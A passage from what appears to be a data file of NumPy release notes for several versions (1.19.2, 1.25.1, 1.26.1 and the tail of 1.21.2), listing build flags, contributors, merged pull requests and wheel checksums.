numpy-1.21.2-cp37-cp37m-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    09858463db6dd9f78b2a1a05c93f3b33d4f65975771e90d2cf7aadb7c2f66edf  numpy-1.21.2-cp37-cp37m-manylinux_2_5_i686.manylinux1_i686.whl\n    805459ad8baaf815883d0d6f86e45b3b0b67d823a8f3fa39b1ed9c45eaf5edf1  numpy-1.21.2-cp37-cp37m-manylinux_2_5_x86_64.manylinux1_x86_64.whl\n    f545c082eeb09ae678dd451a1b1dbf17babd8a0d7adea02897a76e639afca310  numpy-1.21.2-cp37-cp37m-win32.whl\n    b160b9a99ecc6559d9e6d461b95c8eec21461b332f80267ad2c10394b9503496  numpy-1.21.2-cp37-cp37m-win_amd64.whl\n    a5109345f5ce7ddb3840f5970de71c34a0ff7fceb133c9441283bb8250f532a3  numpy-1.21.2-cp38-cp38-macosx_10_9_universal2.whl\n    209666ce9d4a817e8a4597cd475b71b4878a85fa4b8db41d79fdb4fdee01dde2  numpy-1.21.2-cp38-cp38-macosx_10_9_x86_64.whl\n    c01b59b33c7c3ba90744f2c695be571a3bd40ab2ba7f3d169ffa6db3cfba614f  numpy-1.21.2-cp38-cp38-macosx_11_0_arm64.whl\n    e42029e184008a5fd3d819323345e25e2337b0ac7f5c135b7623308530209d57  numpy-1.21.2-cp38-cp38-manylinux_2_12_i686.manylinux2010_i686.whl\n    7fdc7689daf3b845934d67cb221ba8d250fdca20ac0334fea32f7091b93f00d3  numpy-1.21.2-cp38-cp38-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    550564024dc5ceee9421a86fc0fb378aa9d222d4d0f858f6669eff7410c89bef  numpy-1.21.2-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    bf75d5825ef47aa51d669b03ce635ecb84d69311e05eccea083f31c7570c9931  numpy-1.21.2-cp38-cp38-manylinux_2_5_i686.manylinux1_i686.whl\n    a9da45b748caad72ea4a4ed57e9cd382089f33c5ec330a804eb420a496fa760f  numpy-1.21.2-cp38-cp38-manylinux_2_5_x86_64.manylinux1_x86_64.whl\n    e167b9805de54367dcb2043519382be541117503ce99e3291cc9b41ca0a83557  numpy-1.21.2-cp38-cp38-win32.whl\n    466e682264b14982012887e90346d33435c984b7fead7b85e634903795c8fdb0  numpy-1.21.2-cp38-cp38-win_amd64.whl\n    dd0e3651d210068d13e18503d75aaa45656eef51ef0b261f891788589db2cc38  numpy-1.21.2-cp39-cp39-macosx_10_9_universal2.whl\n    92a0ab128b07799dd5b9077a9af075a63467d03ebac6f8a93e6440abfea4120d  numpy-1.21.2-cp39-cp39-macosx_10_9_x86_64.whl\n    fde50062d67d805bc96f1a9ecc0d37bfc2a8f02b937d2c50824d186aa91f2419  numpy-1.21.2-cp39-cp39-macosx_11_0_arm64.whl\n    640c1ccfd56724f2955c237b6ccce2e5b8607c3bc1cc51d3933b8c48d1da3723  numpy-1.21.2-cp39-cp39-manylinux_2_12_i686.manylinux2010_i686.whl\n    5de64950137f3a50b76ce93556db392e8f1f954c2d8207f78a92d1f79aa9f737  numpy-1.21.2-cp39-cp39-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    b342064e647d099ca765f19672696ad50c953cac95b566af1492fd142283580f  numpy-1.21.2-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    30fc68307c0155d2a75ad19844224be0f2c6f06572d958db4e2053f816b859ad  numpy-1.21.2-cp39-cp39-win32.whl\n    b5e8590b9245803c849e09bae070a8e1ff444f45e3f0bed558dd722119eea724  numpy-1.21.2-cp39-cp39-win_amd64.whl\n    d96a6a7d74af56feb11e9a443150216578ea07b7450f7c05df40eec90af7f4a7  numpy-1.21.2-pp37-pypy37_pp73-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    76af194fbc117934ec5bbe2ff15177adbd05aeed23f18ee209ed88edcd777e05  numpy-1.21.2.tar.gz\n    423216d8afc5923b15df86037c6053bf030d15cc9e3224206ef868c2d63dd6dc  numpy-1.21.2.zip\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.26.1": "==========================\n\nNumPy 1.26.1 is a maintenance release that fixes bugs and regressions\ndiscovered after the 1.26.0 release. In addition, it adds new functionality for\ndetecting BLAS and LAPACK when building from source. Highlights are:\n\n- Improved detection of BLAS and LAPACK libraries for meson builds\n- Pickle compatibility with the upcoming NumPy 2.0.\n\nThe 1.26.release series is the last planned minor release series before NumPy\n2.0. The Python versions supported by this release are 3.9-3.12.\n\n\nBuild system changes\n====================\n\nImproved BLAS/LAPACK detection and control\n------------------------------------------\n\nAuto-detection for a number of BLAS and LAPACK is now implemented for Meson.\nBy default, the build system will try to detect MKL, Accelerate (on macOS\n>=13.3), OpenBLAS, FlexiBLAS, BLIS and reference BLAS/LAPACK. Support for MKL\nwas significantly improved, and support for FlexiBLAS was added.\n\nNew command-line flags are available to further control the selection of the\nBLAS and LAPACK libraries to build against.\n\nTo select a specific library, use the config-settings interface via ``pip`` or\n``pypa/build``. E.g., to select ``libblas``/``liblapack``, use::\n\n    $ pip install numpy -Csetup-args=-Dblas=blas -Csetup-args=-Dlapack=lapack\n    $  OR\n    $ python -m build . -Csetup-args=-Dblas=blas -Csetup-args=-Dlapack=lapack\n\nThis works not only for the libraries named above, but for any library that\nMeson is able to detect with the given name through ``pkg-config`` or CMake.\n\nBesides ``-Dblas`` and ``-Dlapack``, a number of other new flags are available\nto control BLAS/LAPACK selection and behavior:\n\n- ``-Dblas-order`` and ``-Dlapack-order``: a list of library names to search\n  for in order, overriding the default search order.\n- ``-Duse-ilp64``: if set to ``true``, use ILP64 (64-bit integer) BLAS and\n  LAPACK. Note that with this release, ILP64 support has been extended to\n  include MKL and FlexiBLAS. OpenBLAS and Accelerate were supported in previous\n  releases.\n- ``-Dallow-noblas``: if set to ``true``, allow NumPy to build with its\n  internal (very slow) fallback routines instead of linking against an external\n  BLAS/LAPACK library. *The default for this flag may be changed to ``true``\n  in a future 1.26.x release, however for 1.26.1 we'd prefer to keep it as\n  ``false`` because if failures to detect an installed library are happening,\n  we'd like a bug report for that, so we can quickly assess whether the new\n  auto-detection machinery needs further improvements.*\n- ``-Dmkl-threading``: to select the threading layer for MKL. There are four\n  options: ``seq``, ``iomp``, ``gomp`` and ``tbb``. The default is ``auto``,\n  which selects from those four as appropriate given the version of MKL\n  selected.\n- ``-Dblas-symbol-suffix``: manually select the symbol suffix to use for the\n  library - should only be needed for linking against libraries built in a\n  non-standard way.\n\n\nNew features\n============\n\n``numpy._core`` submodule stubs\n-------------------------------\n\n``numpy._core`` submodule stubs were added to provide compatibility with\npickled arrays created using NumPy 2.0 when running Numpy 1.26.\n\n\nContributors\n============\n\nA total of 13 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Andrew Nelson\n* Anton Prosekin +\n* Charles Harris\n* Chongyun Lee +\n* Ivan A. Melnikov +\n* Jake Lishman +\n* Mahder Gebremedhin +\n* Mateusz Sok\u00f3\u0142\n* Matti Picus\n* Munira Alduraibi +\n* Ralf Gommers\n* Rohit Goswami\n* Sayed Adel\n\n\nPull requests merged\n====================\n\nA total of 20 pull requests were merged for this release.\n\n* `24742 <https://github.com/numpy/numpy/pull/24742>`__: MAINT: Update cibuildwheel version\n* `24748 <https://github.com/numpy/numpy/pull/24748>`__: MAINT: fix version string in wheels built with setup.py\n* `24771 <https://github.com/numpy/numpy/pull/24771>`__: BLD, BUG: Fix build failure for host flags e.g. ``-march=native``...\n* `24773 <https://github.com/numpy/numpy/pull/24773>`__: DOC: Updated the f2py docs to remove a note on -fimplicit-none\n* `24776 <https://github.com/numpy/numpy/pull/24776>`__: BUG: Fix SIMD f32 trunc test on s390x when baseline is none\n* `24785 <https://github.com/numpy/numpy/pull/24785>`__: BLD: add libquadmath to licences and other tweaks (#24753)\n* `24786 <https://github.com/numpy/numpy/pull/24786>`__: MAINT: Activate ``use-compute-credits`` for Cirrus.\n* `24803 <https://github.com/numpy/numpy/pull/24803>`__: BLD: updated vendored-meson/meson for mips64 fix\n* `24804 <https://github.com/numpy/numpy/pull/24804>`__: MAINT: fix licence path win\n* `24813 <https://github.com/numpy/numpy/pull/24813>`__: BUG: Fix order of Windows OS detection macros.\n* `24831 <https://github.com/numpy/numpy/pull/24831>`__: BUG, SIMD: use scalar cmul on bad Apple clang x86_64 (#24828)\n* `24840 <https://github.com/numpy/numpy/pull/24840>`__: BUG: Fix DATA statements for f2py\n* `24870 <https://github.com/numpy/numpy/pull/24870>`__: API: Add ``NumpyUnpickler`` for backporting\n* `24872 <https://github.com/numpy/numpy/pull/24872>`__: MAINT: Xfail test failing on PyPy.\n* `24879 <https://github.com/numpy/numpy/pull/24879>`__: BLD: fix math func feature checks, fix FreeBSD build, add CI...\n* `24899 <https://github.com/numpy/numpy/pull/24899>`__: ENH: meson: implement BLAS/LAPACK auto-detection and many CI...\n* `24902 <https://github.com/numpy/numpy/pull/24902>`__: DOC: add a 1.26.1 release notes section for BLAS/LAPACK build...\n* `24906 <https://github.com/numpy/numpy/pull/24906>`__: MAINT: Backport ``numpy._core`` stubs. Remove ``NumpyUnpickler``\n* `24911 <https://github.com/numpy/numpy/pull/24911>`__: MAINT: Bump pypa/cibuildwheel from 2.16.1 to 2.16.2\n* `24912 <https://github.com/numpy/numpy/pull/24912>`__: BUG: loongarch doesn't use REAL(10)\n\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    bda38de1a047dd9fdddae16c0d9fb358  numpy-1.26.1-cp310-cp310-macosx_10_9_x86_64.whl\n    196d2e39047da64ab28e177760c95461  numpy-1.26.1-cp310-cp310-macosx_11_0_arm64.whl\n    9d25010a7bf50e624d2fed742790afbd  numpy-1.26.1-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    9b22fa3d030807f0708007d9c0659f65  numpy-1.26.1-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    eea626b8b930acb4b32302a9e95714f5  numpy-1.26.1-cp310-cp310-musllinux_1_1_x86_64.whl\n    3c40ef068f50d2ac2913c5b9fa1233fa  numpy-1.26.1-cp310-cp310-win32.whl\n    315c251d2f284af25761a37ce6dd4d10  numpy-1.26.1-cp310-cp310-win_amd64.whl\n    ebdd5046937df50e9f54a6d38c5775dd  numpy-1.26.1-cp311-cp311-macosx_10_9_x86_64.whl\n    682f9beebe8547f205d6cdc8ff96a984  numpy-1.26.1-cp311-cp311-macosx_11_0_arm64.whl\n    e86da9b6040ea88b3835c4d8f8578658  numpy-1.26.1-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    ebcb6cf7f64454215e29d8a89829c8e1  numpy-1.26.1-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    a8c89e13dc9a63712104e2fb06fb63a6  numpy-1.26.1-cp311-cp311-musllinux_1_1_x86_64.whl\n    339795930404988dbc664ff4cc72b399  numpy-1.26.1-cp311-cp311-win32.whl\n    4ef5e1bdd7726c19615843f5ac72e618  numpy-1.26.1-cp311-cp311-win_amd64.whl\n    3aad6bc72db50e9cc88aa5813e8f35bd  numpy-1.26.1-cp312-cp312-macosx_10_9_x86_64.whl\n    fd62f65ae7798dbda9a3f7af7aa5c8db  numpy-1.26.1-cp312-cp312-macosx_11_0_arm64.whl\n    104d939e080f1baf0a56aed1de0e79e3  numpy-1.26.1-cp312-cp312-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    c44b56c96097f910bbec1420abcf3db5  numpy-1.26.1-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    1dce230368ae5fc47dd0fe8de8ff771d  numpy-1.26.1-cp312-cp312-musllinux_1_1_x86_64.whl\n    d93338e7d60e1d294ca326450e99806b  numpy-1.26.1-cp312-cp312-win32.whl\n    a1832f46521335c1ee4c56dbf12e600b  numpy-1.26.1-cp312-cp312-win_amd64.whl\n    946fbb0b6caca9258985495532d3f9ab  numpy-1.26.1-cp39-cp39-macosx_10_9_x86_64.whl\n    78c2ab13d395d67d90bcd6583a6f61a8  numpy-1.26.1-cp39-cp39-macosx_11_0_arm64.whl\n    0a9d80d8b646abf4ffe51fff3e075d10  numpy-1.26.1-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    0229ba8145d4f58500873b540a55d60e  numpy-1.26.1-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    9179fc57c03260374c86e18867c24463  numpy-1.26.1-cp39-cp39-musllinux_1_1_x86_64.whl\n    246a3103fdbe5d891d7a8aee28875a26  numpy-1.26.1-cp39-cp39-win32.whl\n    4589dcb7f754fade6ea3946416bee638  numpy-1.26.1-cp39-cp39-win_amd64.whl\n    3af340d5487a6c045f00fe5eb889957c  numpy-1.26.1-pp39-pypy39_pp73-macosx_10_9_x86_64.whl\n    28aece4f1ceb92ec463aa353d4a91c8b  numpy-1.26.1-pp39-pypy39_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    bbd0461a1e31017b05509e9971b3478e  numpy-1.26.1-pp39-pypy39_pp73-win_amd64.whl\n    2d770f4c281d405b690c4bcb3dbe99e2  numpy-1.26.1.tar.gz\n\nSHA256\n------\n::\n\n    82e871307a6331b5f09efda3c22e03c095d957f04bf6bc1804f30048d0e5e7af  numpy-1.26.1-cp310-cp310-macosx_10_9_x86_64.whl\n    cdd9ec98f0063d93baeb01aad472a1a0840dee302842a2746a7a8e92968f9575  numpy-1.26.1-cp310-cp310-macosx_11_0_arm64.whl\n    d78f269e0c4fd365fc2992c00353e4530d274ba68f15e968d8bc3c69ce5f5244  numpy-1.26.1-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    8ab9163ca8aeb7fd32fe93866490654d2f7dda4e61bc6297bf72ce07fdc02f67  numpy-1.26.1-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    78ca54b2f9daffa5f323f34cdf21e1d9779a54073f0018a3094ab907938331a2  numpy-1.26.1-cp310-cp310-musllinux_1_1_x86_64.whl\n    d1cfc92db6af1fd37a7bb58e55c8383b4aa1ba23d012bdbba26b4bcca45ac297  numpy-1.26.1-cp310-cp310-win32.whl\n    d2984cb6caaf05294b8466966627e80bf6c7afd273279077679cb010acb0e5ab  numpy-1.26.1-cp310-cp310-win_amd64.whl\n    cd7837b2b734ca72959a1caf3309457a318c934abef7a43a14bb984e574bbb9a  numpy-1.26.1-cp311-cp311-macosx_10_9_x86_64.whl\n    1c59c046c31a43310ad0199d6299e59f57a289e22f0f36951ced1c9eac3665b9  numpy-1.26.1-cp311-cp311-macosx_11_0_arm64.whl\n    d58e8c51a7cf43090d124d5073bc29ab2755822181fcad978b12e144e5e5a4b3  numpy-1.26.1-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    6081aed64714a18c72b168a9276095ef9155dd7888b9e74b5987808f0dd0a974  numpy-1.26.1-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    97e5d6a9f0702c2863aaabf19f0d1b6c2628fbe476438ce0b5ce06e83085064c  numpy-1.26.1-cp311-cp311-musllinux_1_1_x86_64.whl\n    b9d45d1dbb9de84894cc50efece5b09939752a2d75aab3a8b0cef6f3a35ecd6b  numpy-1.26.1-cp311-cp311-win32.whl\n    3649d566e2fc067597125428db15d60eb42a4e0897fc48d28cb75dc2e0454e53  numpy-1.26.1-cp311-cp311-win_amd64.whl\n    1d1bd82d539607951cac963388534da3b7ea0e18b149a53cf883d8f699178c0f  numpy-1.26.1-cp312-cp312-macosx_10_9_x86_64.whl\n    afd5ced4e5a96dac6725daeb5242a35494243f2239244fad10a90ce58b071d24  numpy-1.26.1-cp312-cp312-macosx_11_0_arm64.whl\n    a03fb25610ef560a6201ff06df4f8105292ba56e7cdd196ea350d123fc32e24e  numpy-1.26.1-cp312-cp312-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    dcfaf015b79d1f9f9c9fd0731a907407dc3e45769262d657d754c3a028586124  numpy-1.26.1-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    e509cbc488c735b43b5ffea175235cec24bbc57b227ef1acc691725beb230d1c  numpy-1.26.1-cp312-cp312-musllinux_1_1_x86_64.whl\n    af22f3d8e228d84d1c0c44c1fbdeb80f97a15a0abe4f080960393a00db733b66  numpy-1.26.1-cp312-cp312-win32.whl\n    9f42284ebf91bdf32fafac29d29d4c07e5e9d1af862ea73686581773ef9e73a7  numpy-1.26.1-cp312-cp312-win_amd64.whl\n    bb894accfd16b867d8643fc2ba6c8617c78ba2828051e9a69511644ce86ce83e  numpy-1.26.1-cp39-cp39-macosx_10_9_x86_64.whl\n    e44ccb93f30c75dfc0c3aa3ce38f33486a75ec9abadabd4e59f114994a9c4617  numpy-1.26.1-cp39-cp39-macosx_11_0_arm64.whl\n    9696aa2e35cc41e398a6d42d147cf326f8f9d81befcb399bc1ed7ffea339b64e  numpy-1.26.1-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    a5b411040beead47a228bde3b2241100454a6abde9df139ed087bd73fc0a4908  numpy-1.26.1-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    1e11668d6f756ca5ef534b5be8653d16c5352cbb210a5c2a79ff288e937010d5  numpy-1.26.1-cp39-cp39-musllinux_1_1_x86_64.whl\n    d1d2c6b7dd618c41e202c59c1413ef9b2c8e8a15f5039e344af64195459e3104  numpy-1.26.1-cp39-cp39-win32.whl\n    59227c981d43425ca5e5c01094d59eb14e8772ce6975d4b2fc1e106a833d5ae2  numpy-1.26.1-cp39-cp39-win_amd64.whl\n    06934e1a22c54636a059215d6da99e23286424f316fddd979f5071093b648668  numpy-1.26.1-pp39-pypy39_pp73-macosx_10_9_x86_64.whl\n    76ff661a867d9272cd2a99eed002470f46dbe0943a5ffd140f49be84f68ffc42  numpy-1.26.1-pp39-pypy39_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    6965888d65d2848e8768824ca8288db0a81263c1efccec881cb35a0d805fcd2f  numpy-1.26.1-pp39-pypy39_pp73-win_amd64.whl\n    c8c6c72d4a9f831f328efb1312642a1cafafaa88981d9ab76368d50d07d93cbe  numpy-1.26.1.tar.gz\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.19.2": "==========================\n\nNumPy 1.19.2 fixes several bugs, prepares for the upcoming Cython 3.x release.\nand pins setuptools to keep distutils working while upstream modifications are\nongoing. The aarch64 wheels are built with the latest manylinux2014 release\nthat fixes the problem of differing page sizes used by different linux distros.\n\nThis release supports Python 3.6-3.8. Cython >= 0.29.21 needs to be used when\nbuilding with Python 3.9 for testing purposes.\n\nThere is a known problem with Windows 10 version=2004 and OpenBLAS svd that we\nare trying to debug. If you are running that Windows version you should use a\nNumPy version that links to the MKL library, earlier Windows versions are fine.\n\nImprovements\n============\n\nAdd NumPy declarations for Cython 3.0 and later\n-----------------------------------------------\nThe pxd declarations for Cython 3.0 were improved to avoid using deprecated\nNumPy C-API features.  Extension modules built with Cython 3.0+ that use NumPy\ncan now set the C macro ``NPY_NO_DEPRECATED_API=NPY_1_7_API_VERSION`` to avoid\nC compiler warnings about deprecated API usage.\n\nContributors\n============\n\nA total of 8 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Charles Harris\n* Matti Picus\n* Pauli Virtanen\n* Philippe Ombredanne +\n* Sebastian Berg\n* Stefan Behnel +\n* Stephan Loyd +\n* Zac Hatfield-Dodds\n\nPull requests merged\n====================\n\nA total of 9 pull requests were merged for this release.\n\n* `16959 <https://github.com/numpy/numpy/pull/16959>`__: TST: Change aarch64 to arm64 in travis.yml.\n* `16998 <https://github.com/numpy/numpy/pull/16998>`__: MAINT: Configure hypothesis in ``np.test()`` for determinism,...\n* `17000 <https://github.com/numpy/numpy/pull/17000>`__: BLD: pin setuptools < 49.2.0\n* `17015 <https://github.com/numpy/numpy/pull/17015>`__: ENH: Add NumPy declarations to be used by Cython 3.0+\n* `17125 <https://github.com/numpy/numpy/pull/17125>`__: BUG: Remove non-threadsafe sigint handling from fft calculation\n* `17243 <https://github.com/numpy/numpy/pull/17243>`__: BUG: core: fix ilp64 blas dot/vdot/... for strides > int32 max\n* `17244 <https://github.com/numpy/numpy/pull/17244>`__: DOC: Use SPDX license expressions with correct license\n* `17245 <https://github.com/numpy/numpy/pull/17245>`__: DOC: Fix the link to the quick-start in the old API functions\n* `17272 <https://github.com/numpy/numpy/pull/17272>`__: BUG: fix pickling of arrays larger than 2GiB\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    b74295cbb5b1c98f46f26e13c0fca0ea  numpy-1.19.2-cp36-cp36m-macosx_10_9_x86_64.whl\n    3e307eca6c448bbe30e4c1dc99824642  numpy-1.19.2-cp36-cp36m-manylinux1_i686.whl\n    bfe6c2053a7a792097df912d1175ef7e  numpy-1.19.2-cp36-cp36m-manylinux1_x86_64.whl\n    3b61953b421460abc7d2ecb4df4060bc  numpy-1.19.2-cp36-cp36m-manylinux2010_i686.whl\n    7c442b7c5af62bd5be669bf6c360e114  numpy-1.19.2-cp36-cp36m-manylinux2010_x86_64.whl\n    f6eaf46804f0d66c123fa7ff728b178e  numpy-1.19.2-cp36-cp36m-manylinux2014_aarch64.whl\n    30bbe0bcd774ab483c7494d1cf827199  numpy-1.19.2-cp36-cp36m-win32.whl\n    cf54372ccde7de333d7b69cd16abfa70  numpy-1.19.2-cp36-cp36m-win_amd64.whl\n    285d0fc2986bf4a050523d98f47f2175  numpy-1.19.2-cp37-cp37m-macosx_10_9_x86_64.whl\n    a0901b44347ba39154058a26a9fc8e77  numpy-1.19.2-cp37-cp37m-manylinux1_i686.whl\n    21bfe38bdb317ad4af4959279dd90fde  numpy-1.19.2-cp37-cp37m-manylinux1_x86_64.whl\n    ec32c124ace9c08399e88b8eca6d7475  numpy-1.19.2-cp37-cp37m-manylinux2010_i686.whl\n    0d5cae15043a8172a1b8a478b7c98119  numpy-1.19.2-cp37-cp37m-manylinux2010_x86_64.whl\n    c7e9905e721dc31a666f59e30e37aa0d  numpy-1.19.2-cp37-cp37m-manylinux2014_aarch64.whl\n    ad32d083e641f2cf1a50fe821f3673a7  numpy-1.19.2-cp37-cp37m-win32.whl\n    a243b3e844507e424e828430010612c1  numpy-1.19.2-cp37-cp37m-win_amd64.whl\n    8f4d5df29d4fbf21bf8c4c976595214f  numpy-1.19.2-cp38-cp38-macosx_10_9_x86_64.whl\n    7b003b2fd18125f3956eb3a182ab0d7f  numpy-1.19.2-cp38-cp38-manylinux1_i686.whl\n    e7b8242ee7a79778c6df64772fde5885  numpy-1.19.2-cp38-cp38-manylinux1_x86_64.whl\n    e89e05d24b6f898005e03ba3f01c0641  numpy-1.19.2-cp38-cp38-manylinux2010_i686.whl\n    4cffe85a99bfe08d47d7f1f655142be4  numpy-1.19.2-cp38-cp38-manylinux2010_x86_64.whl\n    39e363f10f0a9af0a8506699118d3aaf  numpy-1.19.2-cp38-cp38-manylinux2014_aarch64.whl\n    13ccd230fefdd56a1679fd72fd0d8a55  numpy-1.19.2-cp38-cp38-win32.whl\n    a3d85f244058882b90140468b86f2e2e  numpy-1.19.2-cp38-cp38-win_amd64.whl\n    ef4cf0675f801a4bf339348fc1843f50  numpy-1.19.2-pp36-pypy36_pp73-manylinux2010_x86_64.whl\n    471156268abd8686e39e811003726ab1  numpy-1.19.2.tar.gz\n    2d011c5422596d742784ba5c2204bc5d  numpy-1.19.2.zip\n\nSHA256\n------\n::\n\n    b594f76771bc7fc8a044c5ba303427ee67c17a09b36e1fa32bde82f5c419d17a  numpy-1.19.2-cp36-cp36m-macosx_10_9_x86_64.whl\n    e6ddbdc5113628f15de7e4911c02aed74a4ccff531842c583e5032f6e5a179bd  numpy-1.19.2-cp36-cp36m-manylinux1_i686.whl\n    3733640466733441295b0d6d3dcbf8e1ffa7e897d4d82903169529fd3386919a  numpy-1.19.2-cp36-cp36m-manylinux1_x86_64.whl\n    4339741994c775396e1a274dba3609c69ab0f16056c1077f18979bec2a2c2e6e  numpy-1.19.2-cp36-cp36m-manylinux2010_i686.whl\n    7c6646314291d8f5ea900a7ea9c4261f834b5b62159ba2abe3836f4fa6705526  numpy-1.19.2-cp36-cp36m-manylinux2010_x86_64.whl\n    7118f0a9f2f617f921ec7d278d981244ba83c85eea197be7c5a4f84af80a9c3c  numpy-1.19.2-cp36-cp36m-manylinux2014_aarch64.whl\n    9a3001248b9231ed73894c773142658bab914645261275f675d86c290c37f66d  numpy-1.19.2-cp36-cp36m-win32.whl\n    967c92435f0b3ba37a4257c48b8715b76741410467e2bdb1097e8391fccfae15  numpy-1.19.2-cp36-cp36m-win_amd64.whl\n    d526fa58ae4aead839161535d59ea9565863bb0b0bdb3cc63214613fb16aced4  numpy-1.19.2-cp37-cp37m-macosx_10_9_x86_64.whl\n    eb25c381d168daf351147713f49c626030dcff7a393d5caa62515d415a6071d8  numpy-1.19.2-cp37-cp37m-manylinux1_i686.whl\n    62139af94728d22350a571b7c82795b9d59be77fc162414ada6c8b6a10ef5d02  numpy-1.19.2-cp37-cp37m-manylinux1_x86_64.whl\n    0c66da1d202c52051625e55a249da35b31f65a81cb56e4c69af0dfb8fb0125bf  numpy-1.19.2-cp37-cp37m-manylinux2010_i686.whl\n    2117536e968abb7357d34d754e3733b0d7113d4c9f1d921f21a3d96dec5ff716  numpy-1.19.2-cp37-cp37m-manylinux2010_x86_64.whl\n    54045b198aebf41bf6bf4088012777c1d11703bf74461d70cd350c0af2182e45  numpy-1.19.2-cp37-cp37m-manylinux2014_aarch64.whl\n    aba1d5daf1144b956bc87ffb87966791f5e9f3e1f6fab3d7f581db1f5b598f7a  numpy-1.19.2-cp37-cp37m-win32.whl\n    addaa551b298052c16885fc70408d3848d4e2e7352de4e7a1e13e691abc734c1  numpy-1.19.2-cp37-cp37m-win_amd64.whl\n    58d66a6b3b55178a1f8a5fe98df26ace76260a70de694d99577ddeab7eaa9a9d  numpy-1.19.2-cp38-cp38-macosx_10_9_x86_64.whl\n    59f3d687faea7a4f7f93bd9665e5b102f32f3fa28514f15b126f099b7997203d  numpy-1.19.2-cp38-cp38-manylinux1_i686.whl\n    cebd4f4e64cfe87f2039e4725781f6326a61f095bc77b3716502bed812b385a9  numpy-1.19.2-cp38-cp38-manylinux1_x86_64.whl\n    c35a01777f81e7333bcf276b605f39c872e28295441c265cd0c860f4b40148c1  numpy-1.19.2-cp38-cp38-manylinux2010_i686.whl\n    d7ac33585e1f09e7345aa902c281bd777fdb792432d27fca857f39b70e5dd31c  numpy-1.19.2-cp38-cp38-manylinux2010_x86_64.whl\n    04c7d4ebc5ff93d9822075ddb1751ff392a4375e5885299445fcebf877f179d5  numpy-1.19.2-cp38-cp38-manylinux2014_aarch64.whl\n    51ee93e1fac3fe08ef54ff1c7f329db64d8a9c5557e6c8e908be9497ac76374b  numpy-1.19.2-cp38-cp38-win32.whl\n    1669ec8e42f169ff715a904c9b2105b6640f3f2a4c4c2cb4920ae8b2785dac65  numpy-1.19.2-cp38-cp38-win_amd64.whl\n    0bfd85053d1e9f60234f28f63d4a5147ada7f432943c113a11afcf3e65d9d4c8  numpy-1.19.2-pp36-pypy36_pp73-manylinux2010_x86_64.whl\n    74d0cf50aa28af81874aca3e67560945afd783b2a006913577d6cddc35a824a6  numpy-1.19.2.tar.gz\n    0d310730e1e793527065ad7dde736197b705d0e4c9999775f212b03c44a8484c  numpy-1.19.2.zip\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.25.1": "==========================\nNumPy 1.25.1 is a maintenance release that fixes bugs and regressions discovered after the\n1.25.0 release. The Python versions supported by this release are 3.9-3.11.\n\nContributors\n============\n\nA total of 10 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Andrew Nelson\n* Charles Harris\n* Developer-Ecosystem-Engineering\n* Hood Chatham\n* Nathan Goldbaum\n* Rohit Goswami\n* Sebastian Berg\n* Tim Paine +\n* dependabot[bot]\n* matoro +\n\nPull requests merged\n====================\n\nA total of 14 pull requests were merged for this release.\n\n* `23968 <https://github.com/numpy/numpy/pull/23968>`__: MAINT: prepare 1.25.x for further development\n* `24036 <https://github.com/numpy/numpy/pull/24036>`__: BLD: Port long double identification to C for meson\n* `24037 <https://github.com/numpy/numpy/pull/24037>`__: BUG: Fix reduction ``return NULL`` to be ``goto fail``\n* `24038 <https://github.com/numpy/numpy/pull/24038>`__: BUG: Avoid undefined behavior in array.astype()\n* `24039 <https://github.com/numpy/numpy/pull/24039>`__: BUG: Ensure ``__array_ufunc__`` works without any kwargs passed\n* `24117 <https://github.com/numpy/numpy/pull/24117>`__: MAINT: Pin urllib3 to avoid anaconda-client bug.\n* `24118 <https://github.com/numpy/numpy/pull/24118>`__: TST: Pin pydantic<2 in Pyodide workflow\n* `24119 <https://github.com/numpy/numpy/pull/24119>`__: MAINT: Bump pypa/cibuildwheel from 2.13.0 to 2.13.1\n* `24120 <https://github.com/numpy/numpy/pull/24120>`__: MAINT: Bump actions/checkout from 3.5.2 to 3.5.3\n* `24122 <https://github.com/numpy/numpy/pull/24122>`__: BUG: Multiply or Divides using SIMD without a full vector can...\n* `24127 <https://github.com/numpy/numpy/pull/24127>`__: MAINT: testing for IS_MUSL closes #24074\n* `24128 <https://github.com/numpy/numpy/pull/24128>`__: BUG: Only replace dtype temporarily if dimensions changed\n* `24129 <https://github.com/numpy/numpy/pull/24129>`__: MAINT: Bump actions/setup-node from 3.6.0 to 3.7.0\n* `24134 <https://github.com/numpy/numpy/pull/24134>`__: BUG: Fix private procedures in f2py modules\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    d09d98643db31e892fad11b8c2b7af22  